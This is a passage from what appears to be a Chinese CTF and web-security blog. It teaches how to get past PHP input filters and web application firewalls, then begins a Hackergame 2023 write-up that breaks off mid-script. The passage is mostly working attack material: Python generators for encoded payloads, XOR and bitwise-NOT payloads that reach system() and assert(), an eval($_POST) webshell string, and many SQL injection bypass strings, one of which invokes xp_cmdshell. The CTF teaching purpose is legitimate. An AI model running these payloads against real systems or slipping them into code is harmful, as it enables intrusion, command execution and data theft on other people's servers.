<code>\u&#123;[0–9A-Fa-f]+&#125;</code>  字符，会输出为 UTF-8 字符串</p><p>payload 处理脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">res_payload += i</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">hex_payload(payload)</span><br><span class="line">oct_payload(payload)</span><br><span class="line">uni_payload(payload)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;</span>();<span class="comment">#phpinfo();</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;</span>(<span class="string">&#x27;id&#x27;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104173537720.png?raw=true" alt="在这里插入图片描述"></p><p>另外，八进制的方法可以绕过 <code>无字母传参</code> 进行代码执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104180029425.png?raw=true" alt="在这里插入图片描述"></p><h2 id="多次传参绕过"><a class="markdownIt-Anchor" href="#多次传参绕过">#</a> <strong>多次传参绕过</strong></h2><p>如果过滤了 <code>引号(单引号/双引号)</code> ，可以通过以下方法绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104185804485.png?raw=true" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="number">1</span>=system&amp;<span class="number">2</span>=whoami</span><br><span class="line">POST:</span><br><span class="line">cmd=<span class="variable">$_GET</span>[<span class="number">1</span>](<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>如果 <code>PHP版本大于7</code>  这里还可以用拼接的方法绕过过滤引号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(sy.st.em)(whoami);</span><br></pre></td></tr></table></figure><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104203723764.png?raw=true" alt="在这里插入图片描述"></p><p>回调函数可能大部分看限制的具体长度，但是在 <code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>  时对以上过滤方法可以绕过</p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104211408314.png?raw=true" alt="在这里插入图片描述"></p><h2 id="内置函数访问绕过"><a class="markdownIt-Anchor" href="#内置函数访问绕过">#</a> 内置函数访问绕过</h2><p><code>get_defined_functions()</code> ：返回所有已定义函数的数组</p><p>利用这种方法首先还需要知道 PHP 的具体版本，因为每个版本的 <code>get_defined_functions()</code>  返回的值都是不一样的，这里以 <code>php7.4.3</code>  为准</p><p><img src="https://img-blog.csdnimg.cn/20210104224616126.png" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225436558.png?raw=true" alt="在这里插入图片描述"></p><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210104225532878.png?raw=true" alt="在这里插入图片描述"></p><h2 id="异或过滤"><a class="markdownIt-Anchor" href="#异或过滤">#</a> <strong>异或过滤</strong></h2><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或  <code>?</code>  和  <code>~</code>  之后得到的是  <code>A</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制：  0111 1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR   0   =   1</span><br><span class="line">0   XOR   1   =   1</span><br><span class="line">0   XOR   0   =   0</span><br><span class="line">1   XOR   1   =   0</span><br><span class="line">上述两个字符异或得到 二进制：  0100 0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure><p>接下来看一道例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了 <code>所有英文字母和数字</code> ，但是我们知道 ASCII 码中还有很多 <code>字母数字之外的字符</code> ，利用这些字符进行异或可以得到我们想要的字符</p><blockquote><p>PS：取 ASCII 表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p></blockquote><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;assert&quot;</span></span><br><span class="line">strlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">95</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>, <span class="number">127</span>]</span><br><span class="line"><span class="comment">#strlist是ascii表中所有非字母数字的字符十进制</span></span><br><span class="line">str1,str2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strlist:</span><br><span class="line">            <span class="keyword">if</span>(i ^ j == <span class="built_in">ord</span>(char)):</span><br><span class="line">                i = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)[<span class="number">2</span>:])</span><br><span class="line">                j = <span class="string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(i,j),end=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line"><span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line"><span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(tmp1,tmp2))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(6) &quot;system&quot;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113191434628.png?raw=true" alt="在这里插入图片描述"></p><p>再放个网上看到的 payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><h2 id="url编码取反绕过"><a class="markdownIt-Anchor" href="#url编码取反绕过">#</a> <strong>URL 编码取反绕过</strong></h2><p>还是上面的例题</p><p>当 PHP&gt;=7 时，可以直接利用取反构造 payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br><span class="line"><span class="comment">#phpinfo();</span></span><br></pre></td></tr></table></figure><p>这里给一个 php 的转化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6);  <span class="comment">//别忘了后面的分号</span></span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021011322442091.png?raw=true" alt="在这里插入图片描述"></p><p>有参数的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;system&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%8C%86%8C%8B%9A%92&quot;</span><br><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;whoami&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%88%97%90%9E%92%96&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);</span><br><span class="line"><span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113225437499.png?raw=true" alt="在这里插入图片描述"></p><h2 id="如何绕过waf"><a class="markdownIt-Anchor" href="#如何绕过waf">#</a> <strong>如何绕过 WAF</strong></h2><p>\1. 当我们在目标 URL 进行 SQL 注入测试时，可以通过修改注入语句中字母的大小写来触发 WAF 保护情况。如果 WAF 使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过 WAF 的过滤。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\2. 关键字替换 (在关键字中间可插入将会被 WAF 过滤的字符) – 例如 SELECT 可插入变成 SEL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\3. 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ URL encode</span><br><span class="line">　　page.php?id=1%252f%252a*/UNION%252f%252a /SELECT +Hex encode</span><br><span class="line">　　www.xxxxx.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…  　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) +Unicode encode</span><br><span class="line">　　?id=10%D6‘%20AND%2201=2%23   　SELECT &#x27;?&#x27;=&#x27;A&#x27;; #1</span><br></pre></td></tr></table></figure><p>\4. 使用注释</p><p>在攻击字符串中插入注释。例如，/<em>!SELECT</em>/ 这样 WAF 可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由 mysql 数据库处理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　   　&#x27;union%a0select pass from users#  index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3   　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</span><br></pre></td></tr></table></figure><p>\5. 某些函数或<a href="https://www.linuxcool.com/">命令</a>，因为 WAF 的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()   sleep() ==&gt;benchmark()   concat_ws()==&gt;group_concat()  substr((select &#x27;password&#x27;),1,1) = 0x70   　strcmp(left(&#x27;password&#x27;,1), 0x69) = 1      strcmp(left(&#x27;password&#x27;,1), 0x70) = 0   　strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 mid()、substr() ==&gt; substring()  @@user ==&gt; user()  @@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><p>\6. 使用特殊符号</p><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ` symbol: select `version()`; + +- :select+id-1+1.from users; + @:select@^1.from users; +Mysql function() as xxx +`、~、!、@、%、()、[]、.、-、+ 、|、%00 示例</span><br><span class="line">　　‘se’+’lec’+’t’   %S%E%L%E%C%T 1   1.aspx?id=1;EXEC(‘ma’+&#x27;ster..x’+&#x27;p_cm’+&#x27;dsh’+&#x27;ell ”net user”’)  &#x27; or --+2=- -!!!&#x27;2    　 id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure><p>\7. HTTP 参数控制<br>　　<br>通过提供多个参数 = 相同名称的值集来混淆 WAF。例如 <a href="http://www.xxxxx.com?id=1&amp;?id=%E2%80%99">http://www.xxxxx.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘在某些情况下 (例如使用 Apache/PHP)，应用程序将仅解析最后 (第二个) id= 而 WAF 只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的 WAF 都不会受到 HTTP 参数污染 (HPP) 的影响，但仍然值得一试。</p><p>+ HPP(HTTP Parameter Polution))</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　/?id=1;select+1,2,3+from+users+where+id=1—   　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure><p>HPP 又称做重复参数污染，最简单的就是？uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的 Web 服务器处理方式如下：</p><p>+HPF (HTTP Parameter Fragment)</p><p>这种方法是 HTTP 分割注入，同 CRLF 有相似之处 (使用控制字符 %0a、%0d 等执行换行)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure><p>+HPC (HTTP Parameter Contamination)<br> RFC2396 定义了以下字符：<br> <code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () Reserved : ; / ? : @ &amp; = + $ , Unwise : &#123; &#125; | \ ^ [ ] </code>  ` 不同的 Web 服务器处理处理构造得特殊请求时有不同的逻辑：以魔术字符 % 为例，Asp/Asp.net 会受到影响。</p><p>\8. 缓冲区溢出</p><p>WAF 和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么 WAF 可能就会崩溃，即使不能代码执行那也会使 WAF 无法正常运行。这样，WAF 的安全防护自然也就被瓦解了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure><p>\9. 整合绕过</p><p>当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxxxx.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame-2023</title>
      <link href="/2023/11/12/Hackergame-2023/"/>
      <url>/2023/11/12/Hackergame-2023/</url>
      
        <content type="html"><![CDATA[<h2 id="hackergame-启动"><a class="markdownIt-Anchor" href="#hackergame-启动">#</a> <strong>Hackergame 启动</strong></h2><p>​利用 burpsuite 拦截发送相似度的报文，对相似度修改为 100 即可。</p><h2 id="猫咪小测"><a class="markdownIt-Anchor" href="#猫咪小测">#</a> <strong>猫咪小测</strong></h2><p>第一问搜索得值中科大中外书籍存在西区图书馆 12 楼，第二问在 arXiv 上搜索 chick 即可，当然也可以暴力，第三问 gpt 或者 CSDN，第四问 Google 搜索关键词 python typing check,halting problem, 检索 2023 年的文献即可得到 ECOOP 为会议。</p><h2 id="更深更暗"><a class="markdownIt-Anchor" href="#更深更暗">#</a> <strong>更深更暗</strong></h2><p>直接在浏览器 F12 和 ctrl+f 搜索 flag 即可</p><h2 id="旅行照片"><a class="markdownIt-Anchor" href="#旅行照片">#</a> <strong>旅行照片</strong></h2><p>根据图片或奖得主锁定东京大学，google 即可的出东京大学诺贝尔奖得主信息。</p><p>再实景地图找公园，锁定活动在 googl 找到相关线上志愿报名，门票钱搜索可知东京大学学生免费。</p><h2 id="赛博井字棋"><a class="markdownIt-Anchor" href="#赛博井字棋">#</a> <strong>赛博井字棋</strong></h2><p>burpsuite 抓包发现下的棋子通过 x 和 y 定位，在棋盘本身不能下到电脑下过的地方，试一下修改 x,y 值到电脑下过的地方，发现覆盖，即可获胜。</p><h2 id="奶奶睡前的flag"><a class="markdownIt-Anchor" href="#奶奶睡前的flag">#</a> <strong>奶奶睡前的 flag</strong></h2><p>这道题之前做过类似的似乎（虽然我做的题很少很少，但还是想起来最近某次比赛一道没做出来的 MISC 里有这么一道，当时是 windows 的 snipping tools 的 bug），遂搜索，发现 google 手机也能利用这个漏洞，在 github 上翻出源码，执行选择最老的 google 手机即可获取 flag。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/1.png?raw=true" alt="600"></p><p>通过抓包获取撤回信息的格式，直接上脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 定义基本的 URL 和请求头</span><br><span class="line">BASE_URL = &quot;http://202.38.93.111:10021&quot;</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://202.38.93.111:10021&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://202.38.93.111:10021/&quot;,</span><br><span class="line">    &quot;Cookie&quot;: 